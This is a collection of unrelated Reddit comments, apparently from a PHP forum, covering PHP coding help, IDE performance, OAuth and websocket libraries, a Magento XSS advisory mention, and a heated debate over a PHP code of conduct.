&gt; There is an actual debate ongoing on other channels where people from both sides, and anywhere in between, can just talk as rational people. So certain sites and debates are ignored, the very thing these 'marginalized' folks complain about other than harassment and being victimized? &gt; It's just ridiculous rhetoric. Yes, that contributors covenant _is_ ridiculous rhetoric.
Are you by any chance editing files on a network share? ^^^^in ^^^^China ^^^^^^over ^^^^^^dial-up
**Seriously... what is going on here... anything?** I came across this code when I took over a website but am unsure of what it really does. It is located in the functions.php of a WordPress installation. After doing `grep -ri 'get_field[^_].' *`in the template directory, I'm not finding the function in use anywhere except the code shown below. Am I crazy or is this some technique I'm not aware of? It seems to me like a piece of code that was never finished to me. function get_field($str) {} if(get_field('fields')) { echo '&lt;p&gt;' . get_field('field_name') . '&lt;/p&gt;'; }
I'm looking for input validation libraries, not useless bloated frameworks. 
Thanks!
Exactly, because "Verfolger" would not be a proper translation. We don't have one. Btw. they renamed it to primary/replica, which fits it quite well actually.
The point is not to disable all the features, but to find a balance between what your computer can handle and the features you need. At home I leave everything enabled, but at work (where I'm still using an old core 2 quad with 4GB of RAM and editing some legacy project with huge files), disabling a few language injections made it a lot faster and I don't lose a lot of features. Note that you can do the opposite : a colleague of mine uses vi, and progressively turned it into an IDE by installing dozens of plugins untill it started eating 6GB of RAM and became almost unusable ^^
This is the mailer error "Mailer Error: The following From address failed: &lt;email&gt;@gmail.com : Called Mail() without being connected" and with the "mail()" ... aparently now works.. i dont understand nothing, both of them worked before moving from my old host
I doubt anyone uses 100% of an IDE's features. At least, I hope not, that sounds terrible. 
thank you :)
If you're going to link to things, please link to them directly rather than via pocket.
The "PHP Internals Book" 
If your backend doesn't require classes and the job can be done &amp; is maintainable &amp; readable with a simple function, then stick with it? If you think it'll grow in the future, you could either prepare with classes for it now, or wait until you need to?
This is great. Side request, would you find the time for implementing type declarations for class properties? And maybe even in function scopes?
Yeah this is amazing, and like Anthony Ferrara's Generics built with Nikic's PHP parser, it can do alot of wonderful things with PHP that we'd otherwise do just in dreams. Still, I wonder, has anyone ever run benchmark tests for this? Is this just for fun or experimental purposes, or is it ready for production server? 
Why is this so bad? Look at the reporting timeline here: https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html Look at the problems outlined for other bugs here: https://www.ostraining.com/blog/general/magento-shoplift/ https://www.ostraining.com/blog/general/magento/ Magento really do need to up their security game. And very fast.
Your post is just clickbait.
I'm not sure what you're getting at. Are you saying professionalism doesn't exist?
Just applied the same fix in v10 with great results 
It's a function without body. It's not returning anything, so the return value is null, and null is falsy, so the code inside the if condition will never be reached. Looks like incomplete code.
Afraid not, but it basically amounted to looking at $_SERVER['REQUEST_URI'] and figuring out whether to pass the request through to new or old front-controller/router. Only one system would actually see the request. Almost like having index_new.php and index_old.php, but, you know, not stupid. 
It's not necessary to use classes, however it you wanted an easy place to start using them, I would suggest replacing the function that performs the routes action with an invokable class &lt;?php use Slim\Slim; use Pdo; final class AddJob { private $database; private $app; public function __construct(Slim $app, Pdo $database) { $this-&gt;app = $app; $this-&gt;database = $database; } public function __invoke() { try { $job = json_decode($this-&gt;app-&gt;request-&gt;getBody()); $stmt = $this-&gt;database-&gt;prepare($sql); $stmt-&gt;bindParam("title", $job-&gt;title); $stmt-&gt;bindParam("company", $job-&gt;company); $stmt-&gt;bindParam("location", $job-&gt;location); $stmt-&gt;execute(); $job-&gt;id = $this-&gt;database-&gt;lastInsertId(); return json_encode($job); } catch(PDOException $e) { echo '{"error":{"text":'. $e-&gt;getMessage() .'}}'; } } } The you can pass an instance of the class to the slim post method $app-&gt;post('/add_job', new AddJob($app, getConnection())); This is just a very simple example, but it's one way to start introducing classes into your project. EDIT: Formatting
tl;dr - use vim
Awesome! While I am not a huge PHP lover, many in our office use PHP heavily still, they would love that book!
&gt; The Laravel community is one of the most toxic ones ever Are you talking about the views and actions of 2-3 people in particular. As someone who has been involved in the Laravel community for a long time (and deeper than average) I have not seen any evidence of this generalisation. I do think certain people have acted poorly in the past, but that doesn't mean the community is toxic or even unwelcoming. Edit: of course, being cisgender, white, male means I am buried in privilege...
Seems like terribly designed code indeed.
Not always. We had to rewrite a Joomla site that had a half million members using it. Staying on Joomla was a bad idea anyways for their purpose. That being said, there was no "fixing" their code base and it was so old you couldn't ever upgrade it to newer versions. Unless you wanted to have a hacked together, insecure, terrible code base a complete write was the only option. The idea that there's a "the best" that can be blanketed to any thing without analysis seem a bit premature lol
Fair enough. For the sake of simplicity covariance will probably do for now in this RFC even though it's wrong, but it really grinds my gears when efforts to make PHP a useful and modern language are countered with "but PHP devs wont get it". I don't care how smart other PHP devs are. I have 10 developers working on an enormous PHP codebase that's 10-15 years old and we can't afford to rewrite it in Java or C#. We need PHP to step up. Generics will be a huge boon for us. Thanks.
Thanks for the reply. I *knew* there was no way it would return anything but deep down, I was a little scared to delete it. I've been dealing with so much JS wrapped in PHP that used JQuery to print PHP, I'm getting shell (#!/bin/sh) shocked.
Indeed. After they switched to their new licensing scheme I was ready to find an alternative to save a bit of cash. But damn, v10 is working really well. It's well worth it. 
&gt; we don't know yet whether anyone on internals is going to even take this seriously *shivers* I can't bear the thought. Godspeed.
&gt; Ideally, use a router which will generate absolute URLs that are correct for the host on which the PHP is being executed Absolutely (pun?). I'm a big fan of this approach. Any modern script should never (ever) have any hardcoded hostnames anywhere in the code, aside from configuration variables. A properly coded CMS for instance should be able to switch between hosts with only the minimal of changes. It saves everyone (yourself, and other devs) a great deal of aggravation and lost time. 
That sounds like some really lazy coding honestly. If you can't break up 100k lines of utility functions, I feel like you don't have a good grasp of the problem you're trying to solve or how to organize different ideas/functions.
Load time: https://youtu.be/owiJIGcnEss my load time with one project auto loaded - ~19s. mbp 2012 16g 480ssd. Not *the* beefiest machine, but not a slouch either. (oh, and this was done 10 seconds after I closed phpstorm before - it had just been open). Would def like faster if possible without having to upgrade hardware...
Did it fix the issue where the keyboard starts going crazy after it has been open too long?
I won't say I am an expert by any means so that may be the problem but Data Service files tend to get big. maybe I should have separated `SecurityDataService.vb`into multiple files but nobody wants to touch these files because someone else's code might break when you touch it. 
You can modify the language itself, kind of like how C preprocessors work, or Ruby as a language altogether. AKA maintenance hell
I'd be willing to settle with having to run my scripts through a pre-processor that expands these macros. It will produce redundancies in places but it's still good.
After taking a quick glance at the RFC, I'm wondering if this invalidates the previous use of bitwise operators with strings. For example: ('a' | 'b') === 'c' I've used this previously, for example, in [constant time string comparisons](https://github.com/Riimu/Kit-CSRF/blob/master/src/CSRFHandler.php#L320). I may have missed this in the RFC document, since I didn't have time to read it fully so a clarification would be nice.
this could be good for adding some framework-specific syntactic sugar. unfortunately IDE's won't play nicely with the custom PHP syntax. does pre-process automagically or you need to run a transpiler manually? does it cache the processed results? 
I agree with everything in the article except the "Functions shouldn't be longer than 20 lines" and "large if/else logic should be its own function". I have never seen that in any large library, and that actually becomes less readable going up and down a file between tons of functions. It does make sense if you need to test a part of the logic, though.
Nice. Combined with [composer's script](https://getcomposer.org/doc/articles/scripts.md) you cannot forget to run the preprocessor.
I used to have phpstorm on my mac airbook. Hogged the CPU and hammered the fan, even with nearly all the inspectors turned off. Now I use TextMate with file browser side window open.
Slim supports Class Controllers functionality ([mentioned in 2.4.0 release notes](https://github.com/slimphp/Slim/releases/tag/2.4.0)) You could uses classes like: ``` $app-&gt;post('/add_job/:foo', '\Job:addJob'); ``` It will instantiate class \Job and pass the value of "Foo" into its addJob method. Note the single ":" colon. This is a unique syntax used by Slim to implement this functionality. Do not confuse this with the "::" syntax used for static method calls. 
We've gotten a lot of these articles in the last few weeks and the one thing they're all missing is any actual text from the proposed code of conduct.
&gt; The stored cross-site scripting (XSS) bug is present in virtually all versions of Magento Community Edition and Enterprise Edition prior to 1.9.2.3 and 1.14.2.3, respectively, according to researchers from Sucuri
Well done, author of the post. You win 10 enlightenment points. But what do you say to someone who does care? edit: I do think the CoC he cites is a bit ridiculous. But you can't pick an extreme example of something and then dismiss all others out of hand because they _might_ be like that.
I don't understand why this is anonymous?
Because social justice will hunt him down and get him fired if he signed the post. 
really?
[removed]
no, but also this is a duplicate.
It's probably way too resource intensive to have your server 'watch' and record the video. Instead, you could pass this responsibility to the browser and have them send back the video (or frames) to the server. I have no decent suggestions on how to do this reliably, but my first path would be html5 canvas since it's quite straight forward to dump frames from a canvas. You might find your server still needs to turn the frames into a video - as I'm pretty sure you can't export frames as an encoded video in html5.
This is the end result once "how one feels" is a what determines reality.
You know, explaining why another group has it so awful doesn't justify that group acting the same way.
There are always some immature people on the internet, remember the case where a 12yo sent SWAT teams to dozens of people? Destroying someone's reputation or life is easier than ever.
Ah, I get it now. The problem with the plugin at present is that it looks more difficult to write the configuration files than just including the comments. So if the plugin could offer configuration files for the popular frameworks and libraries (or other plugins could do that) it would make it more useful. 
because of a thing called "the slippery slope"
So basically the North's reaction to slavery would have made you to support slavery. The US reaction against Iran developing the nuclear weapon would convince you to support Iran getting the nuclear weapon. With such powerful logic you definitely need protection against "assholes"
&gt; However, the fact of life is that many minorities will have their contributions questioned and belittled just because they are part of minority. In the open source world, that sort of discrimination is more difficult to pull off because the default state of the Internet is anonymity. These are words on a screen. Some of you might know the name attached to them. Even fewer know what labels to associate with it. (And I won't list any here of significance.)
&gt;But what do you say to someone who does care? I hope PHP3 forever installs itself on all that you do. Other than that, there's no mommy for the internet, and any attempt at making one so far has just resulted in people getting upset at ridiculous things and getting good people fired from their jobs. Its a reality of life, move on, make something better and show others what you can do.
I am offended by your post that says that all thing offensive need to never be said again.
I support a PHP code of conduct. Therefore I support slavery. Hmmm. 
I have seen no evidence, not even anecdotal, that supporting witch hunters outnumber opposing witch hunters on this topic, and certainly not by 100 to 1. 
The author is being tongue in cheek to show how ridiculous the core argument is. 
A CoC in general — say, the one PGSQL uses — isn't bad anyway. Most of the people are just arguing against the Contributors Covenant, because it has a very simplistic world view.
Then these people have to be treated the same way as anyone else there, too. But there's no need for a CoC for that, as that's already part of the general Netiquette.
I'll keep writing code for my (and whoever else enjoys it) benefit. I don't read Codes of Conduct as I just don't see a point in them, I wouldn't be part of a community that tries to enforce an agenda or advocates "internet prisons" of any kind. I agree with what a lot of the author says, but please, you're not a victim of anything - There is a solution for scenarios where you feel like your ability to write code is in jeopardy: Find somewhere else to code and tell them to suck CoC. ;) 
So either I oppose a PHP code of conduct or I'm a slavery-supporting social justice warrior?
https://en.m.wikipedia.org/wiki/Rhetorical_device#Irony_and_metaphor
&gt; Ultimately, I reject your basic premise. Ironic, considering I have no idea what your race is, sex is, gender is, sexual orientation is, or any groups you belong to. You know more about me than I do about you. To me, you are anonymous. &gt; The dominate player in the room of open source is GitHub where the default behavior is to use your real name and avatar. Was this always the case? Will this always be the case? &gt; I just don't see evidence that default state of *this* open source project is anonymous. "The default state" says NOTHING about its statistical significance. When you go to sign up for a Github account, who decides what information you provide? You do! If you put down false and/or blatantly anonymized information... guess what, you're still registered. Anonymity is closely tied to privacy. Privacy is the right to selectively reveal oneself to the world. Privacy is not secrecy. The Internet only learn about you what you decide to reveal, one way or another. If the incentives align for revealing one's identity, I fully expect most people to do so. Especially the top contributors to a massively successful open source project. That doesn't have any bearing on the fact that, by default, nobody knows who you are online until you tell them (directly or otherwise).
[Kafkatrap](http://esr.ibiblio.org/?p=2122)!
It might require discipline/effort to maintain, but until you reveal information you're an unknown.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Use [Composer](https://github.com/composer/composer) with [PSR-4](http://www.php-fig.org/psr/psr-4/) to autoload your project. It uses namespaces and you will thank yourself for setting it up properly. It enforces some basic organizational structure into your code based on namespaces, without actually telling you to shove your views in this place, or your controllers in that place. 
&gt; how does code from a minority get discriminated against or towards? They either get people giving them the benefit of the doubt, or they have people giving them shit like "You're only here to meet the diversity requirements". The view from someone who benefited from 'looking the part' - "[As a novice computer programmer, I always got the benefit of the doubt—because I looked the part.](http://www.slate.com/articles/technology/technology/2014/01/programmer_privilege_as_an_asian_male_computer_science_major_everyone_gave.html)" &gt; Do you seriously think someone would try to find out who the author of a piece of code is, just to judge them based on skin color or gender, before merging? No, but I do expect people to behave as they naturally do once they learn of someone's gender/race. I don't think people writing software are magically less bigoted than normal people. And people in general react differently to people who are not like them. 
&gt; No, but I do expect people to behave as they naturally do once they learn of someone's gender/race. &gt; &gt; I don't think people writing software are magically less bigoted than normal people. And people in general react differently to people who are not like them. I’ve never seen anything like that. Sure, I’m a white female, but my english isn’t that good. Anyway, why would people care enough to discriminate against others, or even form a prejudice?
&gt; Because you are a white male No, I'm not. &gt; and most of your friends are probably white males Not really, no. &gt; and so it's easiest to picture it. I usually picture their avatar. That means I think of Levi Morrison as a kitten and Leigh as an orangutan. Maybe I'm weird. &gt; Let's not pretend like we're all perfect people with no biases or prejudices. We all have them. If you're speaking for yourself, then I agree. &gt; The default state of the internet is white male. Not for me it isn't.
I think there are not enough black cooks with one leg shorter than the other in the PHP community, so I think it should be addressed by some kind of community-wide statement. Maybe we should also set up some quotas and evaluate developers not by their skills and the fact that they are interested in coding, but rather by their age and skin colour. I'm not sure, in this case and with this line of reasoning, who would be ultimately considered as racist (and ageist!)
I'm well aware that positive discrimination often doesn't solve the problem, which is why I didn't suggest it. I'm also aware that we need to do more than make a community-wide statement, which is why I said exactly that. Also note that, whereas 'black cooks with one leg shorter than the other' is a tiny minority in London, "all women, all non-white people, and all people over 40" are absolutely enormous groups - in fact, they account for around 75% of the working-age population in London. If the PHP community London is excluding 75% of the London population, I consider that to be a bad thing.
Andrea says it better than I do, but if you think procedures are pollution, you may have a very negative outlook on OO after all.
I'm a card-carrying Native American, thank you very much.
&gt; or even form a prejudice? You're asking why people have prejudices? Because we're descended from monkey, and having prejudices is a really good survival trait when you're a monkey. Not totally related, but close enough: http://www.cracked.com/article_14990_what-monkeysphere.html
You're probably lying.
The content coming from symfony.fi is almost always top notch and very interesting. Keep it going!
?
Why is this anonymous? 
I'm saying that I think your mind was made up beforehand.
No, I genuinely wasn't sure. I thought that the community probably didn't need such a thing, that it was just a political correct gesture that wouldn't make any difference. When I read posts from Paul Jones, Anthony Ferrara and Phil Sturgeon, the way they passionately but respectfully argued their case made me think it was an example of why it wasn't needed. I was also worried that it would be used as a tool to beat people - I don't want to see developers excluded from the community because they wrote a Tweet 5 years ago in favour of abortion (or against abortion, or whatever). However, the more I read of people from both sides making vitriolic attacks against each other, the more I think there needs to be a way of saying "Not in my name". I don't mind people disagreeing with me, or with each other, as long as they do it respectfully. I've also given thought to Anthony's arguments, and concluded that, yes, they best fit my own Rawlsian perspective. 
I'm not sure we're reading the same article, because it seems pretty sincere to me, right down to the standard rhetoric. 
Well procedural programming is for amateurs, OOP is the professional standards. Truth be told, a coder cannot find a full time paid job on the labor market if he only writes procedural code. 
Nope ES2015 is ratified. They are doing yearly releases now. Hence the name.
Seriously. It's unbelievable. It was only a matter of time before Tumblr started leaking into things I actually care about. It's the beginning of the end, people.
Your option tags are wrong. You need closing tags and value attributes like this: &lt;select name="role"&gt; &lt;option value="Top" selected="selected"&gt;Top&lt;/option&gt; &lt;option value="Jungle"&gt;Jungle&lt;/option&gt; &lt;option value="Mid"&gt;Mid&lt;/option&gt; &lt;/select&gt;
You should be aware of the delicious irony that you are trying to dig up dirt on a quite great developer just to further a point that is predicated by your own need for CoC to succeed. I wish you all the best, sincerely, I do. To quote Ella Wilcox Wheeler "...Don’t look for the flaws as you go through life And even when you find them, It is wise and kind to be somewhat blind And look for the virtue behind them...."
Yes my php server is running, I can do hello world and make a simple form with a submit button, I just can't get anything to happen on my webpage.
That's the thing. I am not sure how they would help and I know it is highly advised to program in an object oriented manner.
Some lady fired two men and had them removed from a tech conference because they made a joke about forking a lady's repo that in a conversation she wasn't even part of but only overheard, so, yes. Really. 
This *IS* an issue and everyone involved in anything needs to take a principled position. The code public is being cannibalized by fringe political interests as SJWs insert themselves into places where they don't really belong and want to enforce their views on the acts, views and language of other people. The demand for political correctness is fundamentally incompatible with code work and that is because every developer knows that experience is a path and that the competence is never level. The idealized hugbox model of the world promoted by leftwing extremists that demands severe restrictions on speech and conduct in order to prevent emotional distress is not fundamentally different from the opposing radical views like those of white supremacists and other rightwing extremists. How are CoC demands to censor criticism based on reputation different from e.g. demands of Islamic nations to criminalize criticism of religion? They aren't. These views should be opposed on every level of society, it's just that *we* are talking about it on *this* level. 
any reason you chose not to use PHP 7? Developing in PHP 7 is not only a good idea, but its a much faster development process, especially when using the Symfony framework.
look, we all just do not care. If somebody is out of line, just tell em they are out of line. If this is a "power grab", just fork the damn project. Stop wasting time on this BS.
[removed]
You have been shadowbanned: https://www.reddit.com/user/nunleyalison Note that the /r/php mods had nothing to do with this. You should contact the Reddit admins to request becoming unbanned. Good luck.
Wow. Somehow I missed all 3 of these incidents. There are some monsters out there.
Black, gay, obese, deaf, stutterer, quirky, left-handed, whatever. Hell, you get enough ridicule just for being a PHP developer these days. Let's make a CoC that forbids PHP criticism while we're at it, right? No. If someone is being mean to you because of some way that you are different from them, then the answer is as simple as it's been since the dawn of the Internet: ignore, block, don't feed the trolls. If this person stands between you and your personal goals, then defeat them with kindness, or wisdom, or sheer will. Carve your own path. Whatever the answer is, it doesn't involve giving people the power to silence others.
Lots... *lots*. It's disturbing.
HTML is a markup language that your browser processes, your browser sees &lt;h1&gt;Hello World!&lt;/h1&gt; and renders it. PHP is a server side language, your server must run the PHP and that pass the output to the browser. If you have index.php containing &lt;?php echo '&lt;h1&gt;Hello World!&lt;/h1&gt;'; ?&gt; when you visit index.php in your browser the server runs the php and then responds to your request with: &lt;h1&gt;Hello World!&lt;/h1&gt; The only way your server knows to process php is if your file ends in .php and what's between opening (&lt;?php) and closing (?&gt;) tags, so php won't work in a .html file. However html can be included in a php file, as long as it's not inside PHP tags. For example this is valid for a PHP file: &lt;h1&gt;Hello World! The year is &lt;?php echo date("Y"); ?&gt;&lt;/h1&gt; The reason you're getting a 500 error is because you haven't closed your PHP tags, you've opened some and not closed them, creating invalid PHP: Your rank is: &lt;?php echo $_POST['rank']; Your role is: &lt;?php echo $_POST['role']; ?&gt; This isn't valid, it should be: Your rank is: &lt;?php echo $_POST['rank']; ?&gt; Your role is: &lt;?php echo $_POST['role']; ?&gt; You MUST close your tags if you're switching from PHP to HTML. Have you tried going through the codecademy PHP course? It'll take a few hours but you'll learn a bunch, it's a worthwhile time investment, you won't be fighting the basics then :) https://www.codecademy.com/learn/php Also in future please use the /r/phphelp subreddit instead, or you can use [Stackoverflow](http://stackoverflow.com) instead. Also when asking for programming help **always** include the code involved, otherwise it's very difficult to help :)
*hug*
&gt; I sympathise heavily with both sides of the argument. **I am careful** about everything I say and write online because **I don’t want to be the subject of a witch-hunt** for saying the wrong thing when my intent was, and is never to upset anyone. **I feel this paranoia is really unhealthy**. Emphasis added, because this is something I've seen from everyone discussing the CoC. Given that this is the central point of the article, a point that should appeal to *everyone*, it probably should astound me that /r/PHP has chosen to downvote the shit out of this article while massively upvoting the scaremongering anonymous one... but no, it no longer surprises me at all. Is this really the direction that /r/PHP is taking? 
I'm sure you're in good faith both in opposing code of conducts, and in taking someone to task for their reasons for taking the opposite view, but we need to maintain respect here. Rather than deciding that your interlocutor is beyond logic and reason - and then resorting to sarcasm - you should be confident of your own position, and persuade them to your side. And use diplomacy and civility - they are powerful tools. 
&gt; it's okay for girls to be man-ish [__Is it?__](https://www.youtube.com/watch?v=bSL4cmFW_GU) I think this uniquely feminist notion of institutionalized misogyny in the West is a gross misinterpretation of how our culture has actually evolved. You can say that the "hey guys" vs "hey girls" thing is the result of the ancient idea that women are somehow lesser beings, but have you actually looked up the etymology? Have you asked an evolutionary linguist to show you the evidence that that's how it is? I think confirmation bias plays a big part here. Often we only see what we want to see. If you believe that the cards are overwhelmingly stacked against your demographic at every turn then that's what you're going to see, and you're going to see it all the time, and you're not going to notice the contrary evidence when it's right in your face. 
I use Ratchet for [Therac](https://github.com/sean-der/therac) this is what I have run into * Therac stays up and doesn't have any leaks I am aware of! * I would say build it with blocking database queries, and if it is really an issue you try out other things. But don't complicate things just yet * Works great with PHP 7! 
I've said before in other fora that I am often surprised how much opposition there is to codes of conduct generally. Is the PHP one more objectionable than all the others for conventions and UGs and whatever else over the last ten years? Why the fuss now? There's a couple of features of the article that I disagree with - aside from the hostility of "prigs" etc. aimed at the other side. Here they are: &gt; Developers aren't born into knowledge like some spoiled brats are born into wealth. We all started as beginners, and we all have all the access we will ever need to tutorials and tools on cheap laptops that you can find with the help of friends, public libraries and thrift stores. Computers are dirt cheap compared to just a few decades ago, so unless you are literally incapable of reading this article, you can learn to code. &gt; I'm telling you from experience that if you have a functioning brain it's your own damn fault if you don't like where you are &gt; Privilege has absolutely nothing to do with keeping anyone down in software. Do not tell me that you are facing some sort of obstacle to learning or finding opportunity when you have an Internet connection These all broadly boil down to: * inequality of opportunity does not exist because I have not seen it * inequality of opportunity does not exist because I have not experienced it * we live in a meritocracy and personal achievement is nothing to do with your circumstances or the people around you I'm not inside any Venn diagram of oppression, but I don't find it hard to believe that people around the world - including within open source development - have been hampered by other people's attitudes to their sexuality, gender, race, trans status and so forth. The OP is welcome to their opinions, but I wonder if they might be a bit more circumspect if they were to talk, face to face, to people who have experienced real oppression. There must be _some_ forms of code that we can agree on. The contrived example of harrassment by txtspk hug does seem to be a daft place to start - but surely the community understands that harrassment exists generally, and is keen to do _something_ about it? FWIW, I thought the accountability themes the author covered was quite good - and again, I expect it is possible to write a code of conduct that tries to reduce subjectivity. 
I maintain an OAuth server implementation that uses phpleague's package to implement the specification. We have a fair bit more administrative tools around managing sessions, filling in gaps left open by spec for per-project implementation (per-client application authorization to request tokens to access protected resources on a resource server). I've used both and both implement the specification accurately and are well factored / structured code-bases. In the end, there happened to be a framework bridge for phpleague's package (at the time) that resulted in me owning less code and less overhead in integration testing, so I picked it. The most important thing is to make sure you isolate consuming code from these technical concerns, within reason. I think that both packages are "vetted" and are reasonable to use in production. A small fault of both that I've mentioned with authors before, but is really more an "edge case". Also note that this may be inaccurate now. I haven't looked at either of these in-depth (or future work) in a while because simply, my tests are passing and it just works. ... The OAuth2 specification declares three primary players in the Auth Code handshake: Authorization Server, Resource Server, Client Application. The structure of these packages *suggests* a merged concern of Authorization and Resource Server (it's very common that the "protected resources" are part of the same app as the account store). However, in my case, I maintain a centralized Authorization Server and folks in the environment can register Resource Services with me. The two responsibilities are *physically* separated. When I say that they "suggest" merged concerns; the league package actually has two classes, ResourceServer / AuthorizationServer... BUT the "suggestion" comes in how persistence is expected to be implemented. In early versions, it was expected they would share the same persistence mechanism. In recent versions (4), things are a bit more pluggable, but it still **feels** like the API tends to want to pull you towards "just share the DB, it'll be easier if you do". That is ALL my opinion and feelings on the matter. The fact is, you can totally plug n' play as you wish with both of these packages, which is a good marker of their quality alone. Outside of work, I used the same package to implement basic OAuth features for an open-source project called OpenCFP. You can check that out in link below and I'm glad to answer any questions. https://github.com/opencfp/opencfp /edit: OpenCFP shows *an* integration with Silex and League's oauth server. It's not perfect by any means but is a good example of a unified interface for authentication (IdentityProvider) implemented by OAuth as well as Sentry (soon to be Sentinel).
Silly question. Just installed PHP 7 on Windows, and it required VCRUNTIME140.dll Now I installed the redistributeable files, but I was curious as to why the runtime wouldn't be bundled with PHP. Is it a Microsoft terms of service issue? Some licensing issue? Something technical? Just curious.
I agree, what's your opinion on a CoC like Debians? https://www.debian.org/code_of_conduct
Is there any reason you are not using a query builder? Else that would be my first thing to do much easier to work with then manipulating strings.
Correction: They weren't removed from the conference, and she was also fired from her job.
Thankyou - this looks promising!
I've got to be honest, this is the first I've heard of a query builder (I'm very new to this!)
platform.sh has been using bshaffer's library in production for more than 2 years now.
There is no practical difference (from were I stand) between a person that tries but doesn't understand logic and SJWs that do not reply to arguments and push forward their agenda behaving like a troll. From my previous engagements with SJWs mockery provides the best results. I don't know about you but I see every day news about how liberties are taken away from us and I don't have any resource in me to show any respect to people that are blatantly engaged and micro-managing the remaining portions of the day when I am free from the eye of the state, corporations and the like. I have seen enough of GamerGate, OpalGate etc to understand that you if you give SJWs a finger they will take away your hand... and eat it.
&gt; If you're speaking for yourself, then I agree. Do you honestly believe you're perfect, with no biases or prejudices? I'm not judging you - I've just never known anyone (who would be the right age and maturity for a conversation about this stuff) to believe that about themselves.
Jesus why are you people so obsessed with digging up people's real identities? It's people like you who are part of the problem, people utterly obsessed with other people's race and sex. You're the reason I will never ever contribute openly to the php community. I have a family which I support in my work as a php developer and I can't risk that income to a manic feminist on the Internet taking offense to something I say and "sic'ing" the internet on me or my employer. 
Ah, that makes more sense. Carry on...
I have a site running that gets approximately 1500 simultaneous connections at peak hours, there are a few issues I've encountered with Ratchet over time though. * PHP's default builds only can support ~1000 connections, so I set up a loadbalancer to delegate connections between different socket servers once that became an issue. You can fix this by recompiling php and setting a higher limit, but I didn't want to have to deal with customizing php builds. Also yes, it ignores limits set by the operating system. Also load balancing I feel like in the long run was a better idea for helping scale but that's another story. * I've had the server running for indefinitely without it crashing. As long as you don't code in any memory leaks everything seems to be stable. * You really don't want to access the database at all with the websocket if you can help it. But if the app is small with small traffic then it won't matter much. I made the mistake of converting everything to working with the websocket and it ended up being a very sad and slow mistake ;p. One CPU thread and waiting for the database will make everything really sad and really slow. You can use the http request or whatever other processes to do all the database work and then pass the serialized data to the websocket using zeromq or whatever messaging service you can find. You can then send the serialized message to the users that are required to get the information and just have the websocket deal with passing information off based on a list of user ids or something like that. * When not using SSL a lot of users have issues connecting to websockets thanks to antiviruses being crazy. v.v.
Thank you for the comment. Yes, was thinking about shipping some of the functions to more specific-oriented classes. The thing is that, in general, the controller class that you see there is a part of the model layer. The model layer consists of 3 parts - persistence (DB, storage), business logic and services. The services are mediators between other model parts and views (although, my views are more like templates here). It was my decision to move the service part out and call them controllers - just felt somehow comfortable that way. I could easily pass arguments to model but it feels like I would loose some of the oop touch, since I like to work with class properties :)
Nice to hear that you like it - it was my attention to keep it simple. As simple as possible. I guess, firebase is a bit different story, but who knows... :) you got me right - it is not CMS, there are lots of other tools for that. But for simple CRUD administration in PHP, I found just a couple of solutions out there. phpMyAdmin is the most popular out there, but also comes bundled with lots of perks &amp; things that give me the overwhelming UX, just too many options. There is a nice crud-admin-generator that is built upon Laravel (I would prefer to keep it framework agnostic as much as I can) and felt for me somewhat limiting that running a script over tables could actually decide what kind of columns are there. A crudkit is also an alternative as it felt to provide similar solutions to mine. So to sum up - fetch the best ideas (actually, when I started this, I haven't tried even one of them :D ), best practices, keep the code base as decent as possible, avoid specific frameworks, rather use some of composer packages, imply best patterns, pdo, mobile first, some front-end stack, etc. &lt;- whoa, run too far but still. Leave it there as is, will become handy someday :)
&gt; didn't get what you iterate and why Oh, I am iterating over in two places (yes, I know that it is a pretty heavy operation :D ) - the first one iterates over .json files to build the skeleton of the tables, columns, fields, types, their relations, etc., the second one is plugin specific - iterates over image dir to build the image gallery. It just reads out all images from folders (i use folders to separate images that belong to tables (to structure them), but still allow user to pick any image for the field.)
How do you respond to 60% of women in Silicon Valley reporting being sexually harassed at work? Or about a survey of SV professionals that revealed that on a scale of 1-10 (1 being no problem at all, 10 being the worst it could possibly be), women rated the situation of sexism in Silicon Valley a 6.5 and men rated it a 6.6, with only 1 person saying it wasn't a problem? &gt; there's Donglegate, where two guys got fired for a private conversation that a social justice warrior eavesdropped on. That private conversation about dongles at the convention? It was done in the middle of the convention hall. They weren't in their room or even somewhere remotely private. They were in the middle of a presentation at a developer convention. If they wanted to have a private conversation about dongles, they should have gone somewhere private. &gt; Then there's the guy who landed a probe on a comet who they turned into a pariah because they didn't like his hawaiian shirt. He was wearing a shirt with half-naked women on it. It would be just as unacceptable to wear a dicktowel on stage at a conference. &gt; Then there's Tim Hunt, a British scientist who made a toast at a conference in Korea, a social justice warrior took it out of context to get him fired before his plane landed. You wanna know the phrase that got Tim Hunt fired? &gt; It's strange that such a chauvinist monster like me has been asked to speak to women scientists. Let me tell you about my trouble with girls. Three things happen when they are in the lab: you fall in love with them, they fall in love with you, and when you criticise them they cry. Perhaps we should make separate labs for boys and girls? Not really lighthearted comments or even remotely relevant to make at the 2015 World Conference of Science Journalists. He went on stage and told a bunch of women they're emotionally unstable and shouldn't be allowed in the lab with men. Where do you work where you wouldn't get fired for making comments like that? Where do you work where sitting in a professional conference and making comments about dongles wouldn't get you reprimanded? Where do you work where you can wear shirts with half-naked women on them and everyone thinks it's okay? 
&gt; Have you asked an evolutionary linguist to show you the evidence that that's how it is? My degree is in English Language History with a minor in Linguistics. The anecdote of using "guys" to refer to a group of people was a frequent anecdote my professor liked to use. It's why I chose it.
My guess is that you're correct. There is a reference to needing in on the left side of the [download page.](http://windows.php.net/download#php-7.0)
&gt; He was wearing a shirt with half-naked women on it I'm gonna need to go look this one up again, but IIRC didn't he have *no idea* that he was even making anyone uncomfortable, because all his coworkers that thought it inappropriate also thought it wasn't something worth bringing up? If this is true, and again I'm going to need to go look this one up to make sure of it, then it's actually a really bad example. e: Can't find a great source for these assumptions, so I might be misremembering. The closest I've got is "[The people I work with don’t judge me by my looks but only by the work I have done and can do. Simple.](https://www.theguardian.com/science/2014/nov/13/why-women-in-science-are-annoyed-at-rosetta-mission-scientists-clothing)". Also, [check out other photos of him in this article a few days before the landing of the probe](https://www.theguardian.com/science/2014/nov/02/rosetta-mission-matt-taylor-one-to-watch-comet). This combined with his mannerisms in the apology video continues to make me think it's not appropriate to bundle this case in with the others, outside of internet outrage being a driving force.
